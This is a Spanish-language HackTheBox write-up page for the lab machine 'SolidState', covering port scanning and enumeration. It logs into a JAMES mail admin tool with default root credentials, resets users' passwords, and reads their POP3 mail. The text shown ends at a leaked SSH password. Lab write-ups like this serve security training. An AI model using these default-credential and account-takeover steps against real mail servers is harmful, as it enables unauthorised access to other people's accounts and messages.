@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Hola'>
+<title>WriteUp SolidState</title>
+
+<link rel='canonical' href='/p/writeup-solidstate/'>
+
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='WriteUp SolidState'>
+<meta property='og:description' content='Hola'>
+<meta property='og:url' content='/p/writeup-solidstate/'>
+<meta property='og:site_name' content='Liv3P0ol'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-08-23T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-08-23T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="WriteUp SolidState">
+<meta name="twitter:description" content="Hola">
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/logo1_hu4cd92a203c8104ea58ca026f0632b0b6_33996_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Liv3P0ol</a></h1>
+            <h2 class="site-description">Cybersecurity Analyst</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/liv3p0ol'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://linkedin.com/in/%c3%a1lvaro-gil-banda-323663196'
+                        target="_blank"
+                        title="LinkedIn"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="48px" height="48px"><path fill="#0288D1" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/><path fill="#FFF" d="M12 19H17V36H12zM14.485 17h-.028C12.965 17 12 15.888 12 14.499 12 13.08 12.995 12 14.514 12c1.521 0 2.458 1.08 2.486 2.499C17 15.887 16.035 17 14.485 17zM36 36h-5v-9.099c0-2.198-1.225-3.698-3.192-3.698-1.501 0-2.313 1.012-2.707 1.99C24.957 25.543 25 26.511 25 27v9h-5V19h5v2.616C25.721 20.5 26.85 19 29.738 19c3.578 0 6.261 2.25 6.261 7.274L36 36 36 36z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/whoami/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>Whoami</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Modo oscuro</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#scanning">Scanning</a></li>
+        <li><a href="#enumeration">Enumeration</a></li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hackthebox/" style="background-color: #6cd11c; color: #fff;">
+                HackTheBox
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/writeup-solidstate/">WriteUp SolidState</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Hola
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 23, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="scanning">Scanning</h3>
+<p>Empezamos con el reconocimiento de puertos con un <code>TCP SYN Port Scan</code>.</p>
+<p><strong>Parámetro</strong> → <strong>Descripción</strong></p>
+<ul>
+<li><strong>-p-</strong> → Escanea el rango completo de puertos(65535 puertos).</li>
+<li><strong>&ndash;open</strong> → Puertos que esten solo abiertos.</li>
+<li><strong>-sS</strong> → Escaneo de tipo SYN port scan.</li>
+<li><strong>&ndash;min-rate</strong> → Envia paquetes no más lentos que 5000 por segundo.</li>
+<li><strong>-vvv</strong> → Triple verbose para ver en consola los resultados.</li>
+<li><strong>-n</strong> → No efectua resolución DNS.</li>
+<li><strong>-Pn</strong> → No efectua descubrimientos de hosts.</li>
+<li><strong>-oG</strong> → Guardar el output en formato grepeable.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.10.51 -oG allports
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">25/tcp   open  smtp    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">110/tcp  open  pop3    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">119/tcp  open  nntp    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">4555/tcp open  rsip    syn-ack ttl <span class="m">63</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez obtenidos los puertos que estan abiertos y visibles hacia nosotros, es ora de obtener mas información de los mismos.
+<strong>Parámetro</strong> → <strong>Descripción</strong></p>
+<ul>
+<li><strong>-sC</strong> → Muestra todos los scripts relacionados con el servicio.</li>
+<li><strong>-sV</strong> → Determina la version del servicio.</li>
+<li><strong>-p</strong> → Escanea sobre los peurtos especificados.</li>
+<li><strong>-oN</strong> → Guarda el output en un arcivo con formato normal.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 770084f578b9c7d354cf712e0d526d8b <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 78b83af660190691f553921d3f48ed53 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e445e9ed074d7369435a12709dc4af76 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">25/tcp   open  smtp    JAMES smtpd 2.3.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: solidstate Hello nmap.scanme.org <span class="o">(</span>10.10.16.9 <span class="o">[</span>10.10.16.9<span class="o">])</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Home - Solid State Security
+</span></span><span class="line"><span class="cl">110/tcp  open  pop3    JAMES pop3d 2.3.2
+</span></span><span class="line"><span class="cl">119/tcp  open  nntp    JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
+</span></span><span class="line"><span class="cl">4555/tcp open  rsip?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     JAMES Remote Administration Tool 2.3.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Please enter your login and password
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Login id:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Password:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Login failed <span class="k">for</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Login id:
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port4555-TCP:V<span class="o">=</span>7.93%I<span class="o">=</span>7%D<span class="o">=</span>3/16%Time<span class="o">=</span>641341A4%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
+</span></span><span class="line"><span class="cl">SF:nericLines,7C,<span class="s2">&#34;JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: solidstate<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="enumeration">Enumeration</h3>
+<p>Antes de enumerar el puerto 4555, habría que enumerar todos los puertos anteriores. En mi caso no encontré nada.</p>
+<p>Podemos conectarnos a RSIP mediante <code>nc</code> o <code>telnet</code>, en mi caso usé <code>telnet</code>. Cuando nos intentamos conectar nos pide usuario y contraseña, probamos <strong>root:root</strong> y vemos que funciona.Una vez dentro podemos ejecutar el comando <strong>HELP</strong> para ver los comandos que podemos ejecutar.</p>
+<p>Listamos los usuarios que hay con <code>listusers</code> y vemos que hay 5 existentes.Cambiamos la contraseña a todos los usuarios para despues probar a conectarnos al servicio de correos <strong>POP3</strong> y poder ver que tiene cada no de ellos en su bandeja de entrada.Para cambiar la contraseña usamos el comando <code>setpassword &lt;usuario&gt; &lt;contraseña&gt;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">telnet 10.10.10.51 <span class="m">4555</span>
+</span></span><span class="line"><span class="cl">Trying 10.10.10.51...
+</span></span><span class="line"><span class="cl">Connected to 10.10.10.51.
+</span></span><span class="line"><span class="cl">Escape character is <span class="s1">&#39;^]&#39;</span>.
+</span></span><span class="line"><span class="cl">JAMES Remote Administration Tool 2.3.2
+</span></span><span class="line"><span class="cl">Please enter your login and password
+</span></span><span class="line"><span class="cl">Login id:
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">Welcome root. HELP <span class="k">for</span> a list of commands
+</span></span><span class="line"><span class="cl">listusers
+</span></span><span class="line"><span class="cl">Existing accounts <span class="m">5</span>
+</span></span><span class="line"><span class="cl">user: james
+</span></span><span class="line"><span class="cl">user: thomas
+</span></span><span class="line"><span class="cl">user: john
+</span></span><span class="line"><span class="cl">user: mindy
+</span></span><span class="line"><span class="cl">user: mailadmin
+</span></span><span class="line"><span class="cl">setpassword john live
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> john reset
+</span></span><span class="line"><span class="cl">setpassword mindy live
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> mindy reset
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez cambiadas la contraseñas es hora de conectarse y enumerar el servicio <strong>POP3</strong> .Primero nos conectamos como John,una vez dentro para ver los correos usamos el comando <code>list</code> y podemos ver que solo hay un correo. Para poder ver el contenido usamos <code>RETR 1</code>. Viendo el contenido nos damos cuentas de que John le ha puesto una contraseña temporal a Mindy.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">telnet 10.10.10.51 <span class="m">110</span>
+</span></span><span class="line"><span class="cl">Trying 10.10.10.51...
+</span></span><span class="line"><span class="cl">Connected to 10.10.10.51.
+</span></span><span class="line"><span class="cl">Escape character is <span class="s1">&#39;^]&#39;</span>.
+</span></span><span class="line"><span class="cl">+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+</span></span><span class="line"><span class="cl">USER john
+</span></span><span class="line"><span class="cl">+OK
+</span></span><span class="line"><span class="cl">PASS live
+</span></span><span class="line"><span class="cl">+OK Welcome john
+</span></span><span class="line"><span class="cl">list
+</span></span><span class="line"><span class="cl">+OK <span class="m">1</span> <span class="m">743</span>
+</span></span><span class="line"><span class="cl"><span class="m">1</span> <span class="m">743</span>
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">RETR <span class="m">1</span>
+</span></span><span class="line"><span class="cl">+OK Message follows
+</span></span><span class="line"><span class="cl">Return-Path: &lt;mailadmin@localhost&gt;
+</span></span><span class="line"><span class="cl">Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
+</span></span><span class="line"><span class="cl">MIME-Version: 1.0
+</span></span><span class="line"><span class="cl">Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+</span></span><span class="line"><span class="cl">Content-Transfer-Encoding: 7bit
+</span></span><span class="line"><span class="cl">Delivered-To: john@localhost
+</span></span><span class="line"><span class="cl">Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142<span class="o">])</span>
+</span></span><span class="line"><span class="cl">          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID <span class="m">581</span>
+</span></span><span class="line"><span class="cl">          <span class="k">for</span> &lt;john@localhost&gt;<span class="p">;</span>
+</span></span><span class="line"><span class="cl">          Tue, <span class="m">22</span> Aug <span class="m">2017</span> 13:16:20 -0400 <span class="o">(</span>EDT<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">22</span> Aug <span class="m">2017</span> 13:16:20 -0400 <span class="o">(</span>EDT<span class="o">)</span>
+</span></span><span class="line"><span class="cl">From: mailadmin@localhost
+</span></span><span class="line"><span class="cl">Subject: New Hires access
+</span></span><span class="line"><span class="cl">John, 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Can you please restrict mindy<span class="sb">`</span>s access <span class="k">until</span> she gets <span class="nb">read</span> on to the program. Also make sure that you send her a tempory password to login to her accounts.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Thank you in advance.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Respectfully,
+</span></span><span class="line"><span class="cl">James
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ahora nos conectamos como Mindy y vemos que tiene dos correos.Seleccionamos el segundo correo para ver el contenido y observamos que hay usuario y contraseña los cuales pueden sernos útil para usar en el servicio <code>SSH</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">telnet 10.10.10.51 <span class="m">110</span>
+</span></span><span class="line"><span class="cl">Trying 10.10.10.51...
+</span></span><span class="line"><span class="cl">Connected to 10.10.10.51.
+</span></span><span class="line"><span class="cl">Escape character is <span class="s1">&#39;^]&#39;</span>.
+</span></span><span class="line"><span class="cl">+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+</span></span><span class="line"><span class="cl">USER mindy
+</span></span><span class="line"><span class="cl">+OK
+</span></span><span class="line"><span class="cl">PASS live
+</span></span><span class="line"><span class="cl">+OK Welcome mindy
+</span></span><span class="line"><span class="cl">LIST
+</span></span><span class="line"><span class="cl">+OK <span class="m">2</span> <span class="m">1945</span>
+</span></span><span class="line"><span class="cl"><span class="m">1</span> <span class="m">1109</span>
+</span></span><span class="line"><span class="cl"><span class="m">2</span> <span class="m">836</span>
+</span></span><span class="line"><span class="cl">RETR <span class="m">2</span>
+</span></span><span class="line"><span class="cl">+OK Message follows
+</span></span><span class="line"><span class="cl">Return-Path: &lt;mailadmin@localhost&gt;
+</span></span><span class="line"><span class="cl">Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+</span></span><span class="line"><span class="cl">MIME-Version: 1.0
+</span></span><span class="line"><span class="cl">Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+</span></span><span class="line"><span class="cl">Content-Transfer-Encoding: 7bit
+</span></span><span class="line"><span class="cl">Delivered-To: mindy@localhost
+</span></span><span class="line"><span class="cl">Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142<span class="o">])</span>
+</span></span><span class="line"><span class="cl">          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID <span class="m">581</span>
+</span></span><span class="line"><span class="cl">          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
+</span></span><span class="line"><span class="cl">          Tue, <span class="m">22</span> Aug <span class="m">2017</span> 13:17:28 -0400 <span class="o">(</span>EDT<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">22</span> Aug <span class="m">2017</span> 13:17:28 -0400 <span class="o">(</span>EDT<span class="o">)</span>
+</span></span><span class="line"><span class="cl">From: mailadmin@localhost
+</span></span><span class="line"><span class="cl">Subject: Your Access
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dear Mindy,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+</span></span><span class="line"><span class="cl">Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">username: mindy
+</span></span><span class="line"><span class="cl">pass: P@55W0rd1!2@
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Respectfully,
+</span></span><span class="line"><span class="cl">James
+</span></span></code></pre></td></tr></table>
+</div>
